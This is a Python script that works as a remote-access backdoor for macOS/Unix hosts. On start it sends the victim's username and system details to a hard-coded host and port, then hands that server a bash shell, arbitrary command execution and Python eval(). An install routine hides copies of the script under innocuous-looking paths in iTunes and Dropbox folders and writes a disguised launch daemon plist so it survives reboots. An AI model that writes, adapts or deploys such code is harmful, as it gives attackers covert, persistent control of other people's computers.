#!/usr/bin/env python

import socket
import subprocess
import sys
import os
import shutil
import time
import json
import threading
import struct
try:from StringIO import StringIO
except:from io import StringIO

HOST = 'localhost'
PORT = 1708

# Commands
STDIN = "stdin"
EVAL = "eval"
CMD = "cmd"

# Supporting classes

class ByteLockBundler:
    def __init__(self, sock):
        self.stdoutbytes = b''
        self.stderrbytes = b''
        self.sock = sock
        self.bytelock = threading.Lock()

    def setLock(self,lock):
        self.bytelock = lock

    def writeStdout(self, wbytes):
        with self.bytelock:
            self.stdoutbytes += wbytes

    def writeStderr(self, wbytes):
        with self.bytelock:
            self.stderrbytes += wbytes

    def getAndClear(self):
        with self.bytelock:
            out,err = self.stdoutbytes, self.stderrbytes
            self.stdoutbytes = b''
            self.stderrbytes = b''
            return out,err

    def writeBundle(self):
        stdoutbuff, stderrbuff = self.getAndClear()
        if len(stdoutbuff) > 0 or len(stderrbuff) > 0:
            outputdict = dict(stdout=stdoutbuff.decode('UTF-8'),stderr=stderrbuff.decode('UTF-8'))
            json_str = json.dumps(outputdict)
            json_format = formatBytes(json_str)
            self.sock.sendall(json_format)

# Scripts

def main():
    while True:
        if hasInternetConnection():
            try:
                # Get and send info
                user, arch = getInfo()

                infodict = dict(user=user, arch=arch)
                json_str = json.dumps(infodict)
                json_format = formatBytes(json_str)

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((HOST, PORT))
                s.sendall(json_format)
                print("[+] Sent")
                serve(s)
            except Exception as e:
                # TODO: Remove debug code
                raise e
        # Try again in a minute
        time.sleep(60)

def serve(sock):
    bytelock = ByteLockBundler(sock)

    proc = subprocess.Popen(["bash"],
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)

    # Get commands from server, parse and send appropriate to proc
    def pollProcStdout():
        while True:
            out = proc.stdout.read(1)
            if out == '' and proc.poll() is not None:
                break
            if out != '':
                bytelock.writeStdout(out)

    def pollProcStderr():
        while True:
            out = proc.stderr.read(1)
            if out == '' and proc.poll() is not None:
                break
            if out != '':
                bytelock.writeStderr(out)

    def pollSock():
        recvbytes = recvFormatBytes(sock)
        recvjson = json.loads(recvbytes.decode('UTF-8'))

        if STDIN in recvjson:
            proc.stdin.write(recvjson[STDIN].encode('UTF-8'))
            proc.stdin.flush()
        if CMD in recvjson:
            cmd_str = recvjson[CMD]
            cmd_arr = cmd_str.split(" ")
            newproc = subprocess.Popen(cmd_arr)
        if EVAL in recvjson:
            eval(recvjson[EVAL])

    def writeBundles():
        while True:
            time.sleep(0.2)
            bytelock.writeBundle()

    # make thread for each function + one to send json with output to server
    t_sock = threading.Thread(target=pollSock)
    t_procout = threading.Thread(target=pollProcStdout)
    t_procerr = threading.Thread(target=pollProcStderr)
    t_bndl = threading.Thread(target=writeBundles)

    t_sock.start()
    t_procout.start()
    t_procerr.start()
    t_bndl.start()

    t_sock.join()
    t_procout.join()
    t_procerr.join()
    t_bndl.join()

def formatBytes(msg):
    '''
    Takes str or bytes and produces bytes where the first 4 bytes
    correspond to the message length
    :param msg: input message
    :return: <[length][message]>
    '''
    if type(msg) == str:
        msg = str.encode(msg)
    if type(msg) == bytes:
        return (struct.pack('>i', len(msg)) + msg)
    else:
        raise Exception("msg must be of type bytes or str")


def recvFormatBytes(recvable):
    '''
    Receives bytes from recvable, expects first 4 bytes to be length of message,
    then receives that amount of data and returns raw bytes of message
    :param recvable: Any object with recv(bytes) function
    :return:
    '''
    total_len = 0
    total_data = b''
    size = sys.maxsize
    size_data = b''
    recv_size = 8192
    while total_len < size:
        sock_data = recvable.recv(recv_size)
        if not total_data:
            if len(sock_data) > 4:
                size_data += sock_data
                size = struct.unpack('>i', size_data[:4])[0]
                recv_size = min(524288, size)
                total_data += size_data[4:]
            else:
                size_data += sock_data
        else:
            total_data += sock_data
        total_len = len(total_data)
    return total_data

def getInfo():
    proc = subprocess.Popen(["whoami"], stdout=subprocess.PIPE)
    (user, err) = proc.communicate()

    proc = subprocess.Popen(["uname", "-a"], stdout=subprocess.PIPE)
    (arch, err) = proc.communicate()

    return user.decode('UTF-8'), arch.decode('UTF-8')


def hasInternetConnection():
    try:
        socket.getaddrinfo("google.com", 80)
        return True
    except:
        return False


###
#
# All the install scripts are below
#
###

STARTUP_PLIST = ('<?xml version="1.0" encoding="UTF-8"?>' + '\n'
                '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">' + '\n'
                '<plist version="1.0">' + '\n'
                '<dict>' + '\n'
                '\t' + '<key>Label</key>' + '\n'
                '\t' + '<string>pythondaemon</string>' + '\n'
                '\t' + '<key>ProgramArguments</key>' + '\n'
                '\t' + '<array>' + '\n'
                '\t\t' + '<string>{python_path}</string>' + '\n'
                '\t\t' + '<string>{script_path}</string>' + '\n'
                '\t' + '</array>' + '\n'
                '\t' + '<key>StandardErrorPath</key>' + '\n'
                '\t' + '<string>/var/log/python_script.error</string>' + '\n'
                '\t' + '<key>KeepAlive</key>' + '\n'
                '\t' + '<true/>' + '\n'
                '</dict>' + '\n'
                '</plist>' + '\n')

STARTUP_LOCS = ['/System/Library/LaunchAgents',
                '/System/Library/LaunchDaemons',
                '~/Library/LaunchAgents']
DAEMON_NAME = 'library_launcher.plist'

SCRIPT_LOCS = ['~/Music/iTunes/.library.py', '~/.dropbox/.index.py']

INSTALL_FLAG = '-install'


def install():
    # Find python
    proc = subprocess.Popen(["which", "python"], stdout=subprocess.PIPE)
    (out, err) = proc.communicate()
    if err is not None:
        return False
    python_path = out.strip()

    # First find a location for the script
    script_path = None
    for loc in SCRIPT_LOCS:
        script_path = os.path.expanduser(loc)
        if not os.path.exists(script_path):
            try:
                shutil.copy(os.path.abspath(__file__), script_path)
                break
            except:
                pass
    if script_path is None:
        return False

    # Now we have hidden the script
    daemon_loc = None
    for loc in STARTUP_LOCS:
        daemon_loc = os.path.join(os.path.expanduser(loc), DAEMON_NAME)
        if not os.path.exists(daemon_loc):
            try:
                with open(daemon_loc, "w") as f:
                    f.write(STARTUP_PLIST.format(python_path=python_path, script_path=script_path))
                break
            except:
                pass
    if daemon_loc is not None:
        print("Wrote to: {0} {1}".format(script_path, daemon_loc))
        return True


if __name__ == "__main__":
    if INSTALL_FLAG in sys.argv:
        install()
    else:
        main()
